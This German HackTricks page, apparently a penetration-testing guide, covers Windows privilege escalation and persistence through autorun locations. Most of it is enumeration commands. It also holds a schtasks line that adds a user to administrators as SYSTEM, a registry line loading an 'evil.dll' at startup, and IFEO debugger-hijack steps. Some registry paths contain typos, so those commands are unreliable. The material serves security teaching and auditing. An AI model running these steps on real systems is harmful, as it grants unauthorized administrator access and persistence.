# Privilege Escalation mit Autoruns

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie sich für eine **Hacking-Karriere** interessieren und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** kann verwendet werden, um Programme beim **Start** auszuführen. Überprüfen Sie, welche Binärdateien programmiert sind, um beim Start ausgeführt zu werden, mit:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geplante Aufgaben

**Aufgaben** können mit einer **bestimmten Häufigkeit** geplant werden. Überprüfen Sie, welche Binärdateien geplant sind, ausgeführt zu werden, mit:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Ordner

Alle Binärdateien, die sich in den **Startordnern befinden, werden beim Start ausgeführt**. Die gängigen Startordner sind die unten aufgeführten, aber der Startordner wird in der Registrierung angegeben. [Lesen Sie dies, um herauszufinden, wo.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registrierung

{% hint style="info" %}
[Hinweis von hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der Registrierungseintrag **Wow6432Node** zeigt an, dass Sie eine 64-Bit-Version von Windows verwenden. Das Betriebssystem verwendet diesen Schlüssel, um eine separate Ansicht von HKEY\_LOCAL\_MACHINE\SOFTWARE für 32-Bit-Anwendungen anzuzeigen, die auf 64-Bit-Windows-Versionen ausgeführt werden.
{% endhint %}

### Ausführung

**Allgemein bekannte** AutoRun-Registrierung:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Als **Run** und **RunOnce** bekannte Registrierungsschlüssel sind so konzipiert, dass sie Programme automatisch jedes Mal ausführen, wenn sich ein Benutzer am System anmeldet. Die als Datenwert eines Schlüssels zugewiesene Befehlszeile ist auf 260 Zeichen oder weniger begrenzt.

**Service-Ausführung** (kann den automatischen Start von Diensten beim Booten steuern):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Auf Windows Vista und neueren Versionen werden die Registrierungsschlüssel **Run** und **RunOnce** nicht automatisch generiert. Einträge in diesen Schlüsseln können entweder Programme direkt starten oder sie als Abhängigkeiten angeben. Um beispielsweise eine DLL-Datei beim Anmelden zu laden, könnte man den Registrierungsschlüssel **RunOnceEx** zusammen mit einem "Depend"-Schlüssel verwenden. Dies wird durch Hinzufügen eines Registrierungseintrags demonstriert, um "C:\\temp\\evil.dll" während des Systemstarts auszuführen:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Wenn Sie in einem der genannten Registrierungseinträge innerhalb von **HKLM** schreiben können, können Sie Berechtigungen eskalieren, wenn sich ein anderer Benutzer anmeldet.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Wenn Sie eine der auf einem der Registrierungseinträge innerhalb von **HKLM** angegebenen Binärdateien überschreiben können, können Sie diese Binärdatei mit einer Hintertür modifizieren, wenn sich ein anderer Benutzer anmeldet, und Berechtigungen eskalieren.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startpfad

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen, die im **Startup**-Ordner platziert werden, lösen automatisch Dienste oder Anwendungen aus, die während der Benutzeranmeldung oder des Systemneustarts gestartet werden. Der Speicherort des **Startup**-Ordners ist in der Registrierung für den **Local Machine**- und **Current User**-Bereich definiert. Dies bedeutet, dass jede Verknüpfung, die zu diesen angegebenen **Startup**-Speicherorten hinzugefügt wird, sicherstellt, dass der verknüpfte Dienst oder das Programm nach dem Anmelde- oder Neustartvorgang gestartet wird. Dies ist eine einfache Methode, um Programme automatisch zu planen.

{% hint style="info" %}
Wenn Sie einen \[Benutzer] Shell-Ordner unter **HKLM** überschreiben können, können Sie ihn auf einen von Ihnen kontrollierten Ordner verweisen und eine Hintertür platzieren, die jedes Mal ausgeführt wird, wenn sich ein Benutzer im System anmeldet und damit Berechtigungen eskaliert.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon-Schlüssel

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalerweise ist der Schlüssel **Userinit** auf **userinit.exe** eingestellt. Wenn dieser Schlüssel jedoch geändert wird, wird die angegebene ausführbare Datei auch von **Winlogon** beim Anmelden des Benutzers gestartet. Ebenso soll der Schlüssel **Shell** auf **explorer.exe** verweisen, was die Standardshell für Windows ist.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Wenn Sie den Registrierungswert oder die ausführbare Datei überschreiben können, können Sie Berechtigungen eskalieren.
{% endhint %}

### Richtlinieneinstellungen

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Überprüfen Sie den **Run**-Schlüssel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Ändern der Eingabeaufforderung im abgesicherten Modus

In der Windows-Registrierung unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` gibt es standardmäßig einen Wert namens **`AlternateShell`**, der auf `cmd.exe` gesetzt ist. Das bedeutet, dass bei der Auswahl von "Abgesicherter Modus mit Eingabeaufforderung" während des Systemstarts (durch Drücken von F8) `cmd.exe` verwendet wird. Es ist jedoch möglich, Ihren Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne dass Sie F8 drücken und ihn manuell auswählen müssen.

Schritte zum Erstellen einer Startoption für den automatischen Start im "Abgesicherten Modus mit Eingabeaufforderung":

1. Ändern Sie die Attribute der Datei `boot.ini`, um die Schreibgeschützt-, System- und Versteckt-Flags zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffnen Sie `boot.ini` zum Bearbeiten.
3. Fügen Sie eine Zeile wie folgt ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichern Sie die Änderungen an `boot.ini`.
5. Wenden Sie die ursprünglichen Dateiattribute erneut an: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Das Ändern des Registrierungsschlüssels **AlternateShell** ermöglicht die Einrichtung einer benutzerdefinierten Befehlszeilenumgebung und potenziell unbefugten Zugriff.
- **Exploit 2 (Schreibberechtigungen für PATH):** Das Vorhandensein von Schreibberechtigungen für einen Teil der Systemvariablen **PATH**, insbesondere vor `C:\Windows\system32`, ermöglicht die Ausführung einer benutzerdefinierten `cmd.exe`, die eine Hintertür sein könnte, wenn das System im abgesicherten Modus gestartet wird.
- **Exploit 3 (Schreibberechtigungen für PATH und boot.ini):** Schreibzugriff auf `boot.ini` ermöglicht den automatischen Start im abgesicherten Modus und erleichtert unbefugten Zugriff beim nächsten Neustart.

Um die aktuelle Einstellung für **AlternateShell** zu überprüfen, verwenden Sie diese Befehle:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installierte Komponente

Active Setup ist eine Funktion in Windows, die **vor dem vollständigen Laden der Desktop-Umgebung** initiiert wird. Es priorisiert die Ausführung bestimmter Befehle, die vor dem Fortfahren der Benutzeranmeldung abgeschlossen sein müssen. Dieser Prozess findet sogar vor anderen Starteinträgen statt, wie z.B. denen in den Registrierungsbereichen Run oder RunOnce.

Active Setup wird über die folgenden Registrierungsschlüssel verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

In diesen Schlüsseln existieren verschiedene Unterschlüssel, die jeweils einer bestimmten Komponente entsprechen. Schlüsselwerte von besonderem Interesse sind:

- **IsInstalled:**
- `0` gibt an, dass der Befehl der Komponente nicht ausgeführt wird.
- `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird, was das Standardverhalten ist, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Definiert den Befehl, der von Active Setup ausgeführt werden soll. Es kann sich um eine beliebige gültige Befehlszeile handeln, z.B. das Starten von `notepad`.

**Sicherheitseinblicke:**

- Das Ändern oder Schreiben eines Schlüssels, bei dem **`IsInstalled`** auf `"1"` gesetzt ist und ein spezifischer **`StubPath`** vorhanden ist, kann zu unbefugter Befehlsausführung führen, möglicherweise zur Eskalation von Berechtigungen.
- Durch Ändern der im **`StubPath`**-Wert referenzierten ausführbaren Datei kann ebenfalls eine Privilegieneskalation erreicht werden, sofern ausreichende Berechtigungen vorhanden sind.

Um die **`StubPath`**-Konfigurationen der Active Setup-Komponenten zu überprüfen, können folgende Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Übersicht über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die Microsofts Internet Explorer zusätzliche Funktionen hinzufügen. Sie werden bei jedem Start in den Internet Explorer und den Windows Explorer geladen. Ihre Ausführung kann jedoch durch das Setzen des Schlüssels **NoExplorer** auf 1 blockiert werden, was verhindert, dass sie mit Windows Explorer-Instanzen geladen werden.

BHOs sind mit Windows 10 über den Internet Explorer 11 kompatibel, werden jedoch nicht in Microsoft Edge unterstützt, dem Standardbrowser in neueren Versionen von Windows.

Um registrierte BHOs auf einem System zu erkunden, können Sie die folgenden Registrierungsschlüssel überprüfen:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jedes BHO wird durch seine **CLSID** in der Registrierung repräsentiert und dient als eindeutiger Identifikator. Detaillierte Informationen zu jeder CLSID finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Für die Abfrage von BHOs in der Registrierung können folgende Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer-Erweiterungen

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachten Sie, dass im Registrierungsschlüssel für jede DLL ein neuer Registrierungsschlüssel vorhanden ist, der durch die **CLSID** repräsentiert wird. Sie können die CLSID-Informationen in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` finden.

### Schriftarten-Treiber

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Öffnen Sie den Befehl

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options

Die Image File Execution Options (IFEO) sind eine Funktion in Windows, die es ermöglicht, bestimmte Aktionen auszuführen, wenn ein bestimmtes Programm gestartet wird. Dies kann verwendet werden, um die Ausführung von Binärdateien zu überwachen und zu steuern.

IFEO kann für verschiedene Zwecke genutzt werden, einschließlich der Durchführung von Privilege Escalation-Angriffen. Ein Angreifer kann IFEO verwenden, um eine bösartige Binärdatei als Debugger für ein bestimmtes Programm festzulegen. Wenn das Programm gestartet wird, wird auch die bösartige Binärdatei ausgeführt, was dem Angreifer erhöhte Rechte verschafft.

Um IFEO zu nutzen, muss der Angreifer über Administratorrechte verfügen. Der Angreifer kann dann den Registrierungsschlüssel `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` verwenden, um eine neue Unterstützung für das gewünschte Programm zu erstellen. Der Name der Unterstützung sollte dem Namen des Programms entsprechen.

In der neu erstellten Unterstützung kann der Angreifer den Wert `Debugger` auf den Pfad der bösartigen Binärdatei setzen. Dadurch wird die bösartige Binärdatei jedes Mal ausgeführt, wenn das Programm gestartet wird.

Es ist wichtig zu beachten, dass IFEO eine legitime Funktion von Windows ist und normalerweise von Entwicklern verwendet wird, um das Verhalten von Programmen zu steuern. Daher kann das Vorhandensein von IFEO-Einträgen nicht automatisch als bösartig betrachtet werden. Es ist jedoch wichtig, die IFEO-Einträge regelmäßig zu überprüfen, um sicherzustellen, dass keine unbekannten oder verdächtigen Einträge vorhanden sind.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Beachten Sie, dass alle Websites, auf denen Sie Autoruns finden können, bereits von **winpeas.exe** durchsucht wurden. Für eine **umfassendere Liste der automatisch ausgeführten** Dateien können Sie jedoch [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) von SysInternals verwenden:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mehr

**Finde weitere Autoruns wie Registrierungen unter [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Referenzen

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
